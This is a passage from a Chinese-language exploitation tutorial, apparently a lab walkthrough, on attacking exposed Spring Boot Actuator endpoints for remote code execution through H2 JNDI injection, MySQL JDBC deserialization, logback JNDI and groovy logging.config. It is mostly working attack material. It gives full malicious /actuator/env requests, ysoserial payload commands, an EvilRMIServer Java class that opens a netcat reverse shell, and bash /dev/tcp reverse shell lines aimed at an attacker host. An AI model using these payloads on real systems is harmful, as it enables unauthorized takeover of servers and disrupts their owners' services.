<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn install</span><br></pre></td></tr></table></figure>

<p>![image-20210830204556955](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210830204556955.png)</p>
<p>然后指定访问ip地址开启RMI服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=192.168.233.242 -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>

<p>![image-20210830204855751](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210830204855751.png)</p>
<p>使用nc监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>



<p>构造Post方式请求&#x2F;h2-console&#x2F;login.do?session&#x3D;xxxx，请求报文中指定RMI服务的ip地址和端口</p>
<p>请求报文如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /h2-console/login.do?jsessionid=152896463738fcc39cb0a74a0e3b5a1e HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9096</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://192.168.233.242:9096/h2-console/login.jsp?jsessionid=10f21eec1f912ae36cd39c55740101b5</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 163</span><br><span class="line"></span><br><span class="line">language=en&amp;setting=Generic+H2+%28Embedded%29&amp;name=Generic+H2+%28Embedded%29&amp;driver=javax.naming.InitialContext&amp;url=rmi://192.168.233.242:8090/jndi&amp;user=&amp;password=</span><br></pre></td></tr></table></figure>

<p>![image-20210830211055253](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210830211055253.png)</p>
<p>可以看到nc连接shell成功</p>
<p>![image-20210830211733059](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210830211733059.png)</p>
<h5 id="利用原理-7"><a href="#利用原理-7" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
<li>设置恶意url参数向h2-console&#x2F;login.do?session&#x3D;xxxx发出请求</li>
<li>服务器访问恶意url中的RMI服务，发生JNDI注入</li>
<li>RMI服务执行其他的恶意代码</li>
</ul>
<p>详细分析参见</p>
<p><a href="https://mp.weixin.qq.com/s/Yn5U8WHGJZbTJsxwUU3UiQ">Spring Boot + H2数据库JNDI注入</a></p>
<h4 id="2-9-mysql-jdbc-deserialization-RCE"><a href="#2-9-mysql-jdbc-deserialization-RCE" class="headerlink" title="2.9. mysql jdbc deserialization RCE"></a>2.9. mysql jdbc deserialization RCE</h4><blockquote>
<p>该环境需要安装Mysql服务和新建数据库，主要还是application.properties配置文件，注意里面的数据库相关配置(请求的数据库名，数据库账户和密码)</p>
</blockquote>
<h5 id="利用条件-11"><a href="#利用条件-11" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
<li>目标环境中存在 <code>mysql-connector-java</code> 依赖</li>
<li>目标可以请求攻击者的服务器（请求可出外网）</li>
</ul>
<h5 id="利用方法-10"><a href="#利用方法-10" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：查看环境依赖</strong></p>
<p>GET 请求 <code>/env</code> 或 <code>/actuator/env</code>，搜索环境变量（classpath）中是否有 <code>mysql-connector-java</code>  关键词，并记录下其版本号（5.x 或 8.x）；</p>
<p>搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如  <code>commons-collections</code>、<code>Jdk7u21</code>、<code>Jdk8u20</code> 等；</p>
<p>搜索 <code>spring.datasource.url</code> 关键词，记录下其 <code>value</code>  值，方便后续恢复其正常 jdbc url 值。</p>
<p><strong>步骤二：架设恶意 rogue mysql server</strong></p>
<p>在自己控制的服务器上运行 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py">springboot-jdbc-deserialization-rce.py</a> 脚本，并使用 <a href="https://github.com/frohoff/ysoserial">ysoserial</a> 自定义要执行的命令：</p>
<p>这里使用反序列工具ysoserial(包含所有攻击方式，在环境包中的target目录下)ysoserial可以设置的命令参数如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$  java -jar ysoserial.jar</span><br><span class="line">Y SO SERIAL?</span><br><span class="line">Usage: java -jar ysoserial.jar [payload] &#x27;[command]&#x27;</span><br><span class="line">  Available payload types:</span><br><span class="line">     Payload             Authors                     Dependencies</span><br><span class="line">     -------             -------                     ------------</span><br><span class="line">     AspectJWeaver       @Jang                       aspectjweaver:1.9.2, commons-collections:3.2.2</span><br><span class="line">     BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5</span><br><span class="line">     C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11</span><br><span class="line">     Click1              @artsploit                  click-nodeps:2.3.0, javax.servlet-api:3.1.0</span><br><span class="line">     Clojure             @JackOfMostTrades           clojure:1.8.0</span><br><span class="line">     CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2</span><br><span class="line">     CommonsCollections1 @frohoff                    commons-collections:3.1</span><br><span class="line">     CommonsCollections2 @frohoff                    commons-collections4:4.0</span><br><span class="line">     CommonsCollections3 @frohoff                    commons-collections:3.1</span><br><span class="line">     CommonsCollections4 @frohoff                    commons-collections4:4.0</span><br><span class="line">     CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1</span><br><span class="line">     CommonsCollections6 @matthias_kaiser            commons-collections:3.1</span><br><span class="line">     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1</span><br><span class="line">     FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4</span><br><span class="line">     Groovy1             @frohoff                    groovy:2.3.9</span><br><span class="line">     Hibernate1          @mbechler</span><br><span class="line">     Hibernate2          @mbechler</span><br><span class="line">     JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21</span><br><span class="line">     JRMPClient          @mbechler</span><br><span class="line">     JRMPListener        @mbechler</span><br><span class="line">     JSON1               @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1</span><br><span class="line">     JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21</span><br><span class="line">     Jdk7u21             @frohoff</span><br><span class="line">     Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2</span><br><span class="line">     MozillaRhino1       @matthias_kaiser            js:1.7R2</span><br><span class="line">     MozillaRhino2       @_tint0                     js:1.7R2</span><br><span class="line">     Myfaces1            @mbechler</span><br><span class="line">     Myfaces2            @mbechler</span><br><span class="line">     ROME                @mbechler                   rome:1.0</span><br><span class="line">     Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE</span><br><span class="line">     Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2</span><br><span class="line">     URLDNS              @gebl</span><br><span class="line">     Vaadin1             @kai_ullrich                vaadin-server:7.7.14, vaadin-shared:7.7.14</span><br><span class="line">     Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar (payload)  &gt; payload.ser</span><br></pre></td></tr></table></figure>

<p>在脚本<strong>同目录下</strong>生成 <code>payload.ser</code> 反序列化 payload 文件，供脚本使用。</p>
<p><strong>步骤三：设置 spring.datasource.url 属性</strong></p>
<blockquote>
<p>⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！</p>
</blockquote>
<p>mysql-connector-java 5.x 版本设置<strong>属性值</strong>为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true</span><br></pre></td></tr></table></figure>

<p> mysql-connector-java 8.x 版本设置<strong>属性值</strong>为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true</span><br></pre></td></tr></table></figure>



<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.url=对应属性值</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;对应属性值&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤四：刷新配置</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>步骤五：触发数据库查询</strong></p>
<p>尝试访问网站已知的数据库查询的接口，例如： <code>/product/list</code> ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发</p>
<p><strong>步骤六：恢复正常 jdbc url</strong></p>
<p>反序列化漏洞利用完成后，使用 <strong>步骤三</strong> 的方法恢复 <strong>步骤一</strong> 中记录的 <code>spring.datasource.url</code> 的原始 <code>value</code> 值</p>
<h5 id="利用实例-8"><a href="#利用实例-8" class="headerlink" title="利用实例"></a>利用实例</h5><p>访问目标站点 <a href="http://192.168.233.242:9097/actuator/evn">http://192.168.233.242:9097/actuator/evn</a>   查看环境变量设置和依赖</p>
<p>![image-20210901112521481](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210901112521481.png)</p>
<p>然后架设恶意 rogue mysql server，使用 <a href="https://github.com/frohoff/ysoserial">ysoserial</a> 自定义要执行的命令，讲生成的文件放置在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections3 ‘bash -i &gt;&amp; /dev/tcp/192.168.233.242/1234 0&gt;&amp;1’ &gt; payload.ser</span><br></pre></td></tr></table></figure>



<p>然后运行 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py">springboot-jdbc-deserialization-rce.py</a> 脚本开启3306端口</p>
<p>![image-20210901141559697](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210901141559697.png)</p>
<p>POST方式构造请求&#x2F;actuator&#x2F;env，设置spring.datasource.url为上面开启服务的ip地址</p>
<p>请求报文如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9097</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 216</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;jdbc:mysql://192.168.233.242:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>![image-20210901142357376](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210901142357376.png)</p>
<p>访问&#x2F;actuator&#x2F;refresh刷新配置</p>
<p>![image-20210901142612261](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210901142612261.png)</p>
<p>在接着访问数据库查询的接口，在调用数据库服务的时候就会请求上面设置的url</p>
<p>例如： <code>/product/list</code> ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发</p>
<p>可以看到前面开启的mysql服务中会显示连接的客户端和返回的一些内容</p>
<p>![image-20210901142838024](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210901142838024.png)</p>
<p>shell反弹成功</p>
<p>![image-20210901145716430](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210901145716430.png)</p>
<h5 id="利用原理-8"><a href="#利用原理-8" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
<li>spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址</li>
<li>refresh 刷新后设置了一个新的 spring.datasource.url 属性值</li>
<li>当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接</li>
<li>然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据</li>
<li>目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞</li>
</ul>
<p>详细漏洞分析参见下文</p>
<p>​    <a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">New-Exploit-Technique-In-Java-Deserialization-Attack</a></p>
<p>  <a href="http://cn-sec.com/archives/116934.html">  MySQL-JDBC 反序列化 | CN-SEC 中文网</a></p>
<h4 id="2-10-restart-logging-config-logback-JNDI-RCE"><a href="#2-10-restart-logging-config-logback-JNDI-RCE" class="headerlink" title="2.10.  restart logging.config logback JNDI RCE"></a>2.10.  restart logging.config logback JNDI RCE</h4><h5 id="利用条件-12"><a href="#利用条件-12" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1(LDAP)，但相关环境可绕过</li>
<li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li>
<li>⚠️ HTTP 服务器如果返回含有畸形 xml 语法内容的文件，会导致程序异常退出</li>
<li>⚠️ JNDI 服务返回的 object 需要实现 <code>javax.naming.spi.ObjectFactory</code> 接口，否则会导致程序异常退出</li>
</ul>
<h5 id="利用方法-11"><a href="#利用方法-11" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：托管 xml 文件</strong></p>
<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<p>在根目录放置以 <code>xml</code> 结尾的  <code>example.xml</code> 文件，实际内容要根据步骤二中使用的 JNDI 服务来确定：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">&quot;rmi://your-vps-ip:1389/jndi&quot;</span> <span class="attr">as</span>=<span class="string">&quot;appName&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>步骤二：托管RMI服务及代码</strong></p>
<p>编写优化过后的用来反弹 shell 的JAVA代码(只需修改代码中的服务监听端口和反弹shell的ip地址及其端口)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.rmi.registry.*;</span><br><span class="line">import com.sun.jndi.rmi.registry.*;</span><br><span class="line">import javax.naming.*;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line">public class EvilRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Creating evil RMI registry on port xxxxx&quot;);//RMI服务监听地址</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1097);</span><br><span class="line"> </span><br><span class="line">        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span><br><span class="line">        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        //redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span><br><span class="line">        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="line">        //expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span><br><span class="line">        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc xxx.xxx.xxx.xxx xxxx &gt;/tmp/f&#x27;]).start()\&quot;)&quot;));</span><br><span class="line">         //反弹shell地址为xxx.xxx.xxx.xxx(ip地址)，端口为xxxx(端口地址)</span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;jndi&quot;, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>将上面反弹shell的JAVA代码进行打包成jar包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn clean install</span><br><span class="line">或者</span><br><span class="line">javac xxxxxxx.java</span><br><span class="line">jar -cvf  xxxx.jar -C src/ .</span><br></pre></td></tr></table></figure>



<p><strong>步骤三:  启动RMI服务</strong></p>
<p>指定开启连接RMI服务的主机IP地址，架设RMI服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=xxx.xxx.xxx.xxx -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>



<p><strong>步骤三：设置 logging.config 属性</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">logging.config=http://your-vps-ip/example.xml</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.xml&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤四：重启应用</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="利用实例-9"><a href="#利用实例-9" class="headerlink" title="利用实例"></a>利用实例</h5><p>编写example.xml文档，访问192.168.233.242的RMI服务，放置在开启WEB服务的根目录下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">&lt;insertFromJNDI env-entry-name=&quot;rmi://192.168.233.242:8090/jndi&quot; as=&quot;appName&quot;/&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>



<p>然后使用python开启个简单的http服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2  SimpleHTTPServer  -m 80</span><br></pre></td></tr></table></figure>



<p>编写恶意RMI服务的反弹shell的JAVA代码,当用户访问该RMI服务时会导致使用nc连接到攻击者的主机，实现反向shell连接</p>
<p>代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.rmi.registry.*;</span><br><span class="line">import com.sun.jndi.rmi.registry.*;</span><br><span class="line">import javax.naming.*;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line">public class EvilRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Creating evil RMI registry on port 8090&quot;);//RMI服务监听地址为8090</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1097);</span><br><span class="line"> </span><br><span class="line">        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span><br><span class="line">        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        //redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span><br><span class="line">        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="line">        //expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span><br><span class="line">        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.233.242 1234 &gt;/tmp/f&#x27;]).start()\&quot;)&quot;));</span><br><span class="line">         </span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;jndi&quot;, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>将该代码进行maven打包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn install</span><br></pre></td></tr></table></figure>

<p>![image-20210830204556955](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210830204556955.png)</p>
<p>然后指定访问ip地址开启RMI服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=192.168.233.242 -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>

<p>![image-20210830204855751](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210830204855751.png)</p>
<p>使用nc监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>



<p>POST方式构造请求包对&#x2F;actuator&#x2F;env发出请求，设置logging.config为前面example.xml的请求地址</p>
<p>![image-20210831165413164](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210831165413164.png)</p>
<p>然后再访问&#x2F;actuator&#x2F;restart端点重新启动项目加载变量</p>
<p>![image-20210831165556609](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210831165556609.png)</p>
<p>此时就会看到连接shell成功</p>
<p>![image-20210831165644535](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210831165644535.png)</p>
<h5 id="利用原理-9"><a href="#利用原理-9" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
<li>目标机器通过 logging.config 属性设置 logback日志配置文件 URL 地址</li>
<li>restart 重启应用后，程序会请求 URL 地址获得恶意 xml 文件内容</li>
<li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li>
<li>xml 文件中利用 <code>logback</code> 依赖的 <code>insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li>
<li>目标机器请求恶意  JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li>
</ul>
<h4 id="2-11-restart-logging-config-groovy-RCE"><a href="#2-11-restart-logging-config-groovy-RCE" class="headerlink" title="2.11. restart logging.config groovy RCE"></a>2.11. restart logging.config groovy RCE</h4><h5 id="利用条件-13"><a href="#利用条件-13" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li>
<li>⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</li>
<li>⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出</li>
</ul>
<h5 id="利用方法-12"><a href="#利用方法-12" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：托管 groovy 文件</strong></p>
<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<p>在根目录放置以 <code>groovy</code> 结尾的  <code>example.groovy</code> 文件，内容为需要执行的 groovy 代码，比如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;执行代码&quot;)</span><br></pre></td></tr></table></figure>



<p><strong>步骤二：设置 spring.main.sources 属性</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">logging.config=http://your-vps-ip/example.groovy</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤三：重启应用</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h5 id="利用实例-10"><a href="#利用实例-10" class="headerlink" title="利用实例"></a>利用实例</h5><p>编写groovy文件并将其放在http服务根目录下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; /dev/tcp/192.168.233.242/1234 0&gt;&amp;1&quot;)</span><br></pre></td></tr></table></figure>



<p>使用python开启http服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2  -m  SimpleHTTPServer  80</span><br></pre></td></tr></table></figure>



<p>以POST的方式向&#x2F;actuator&#x2F;env请求，设置logging.config为groovy的url地址</p>
<p>请求报文如下</p>
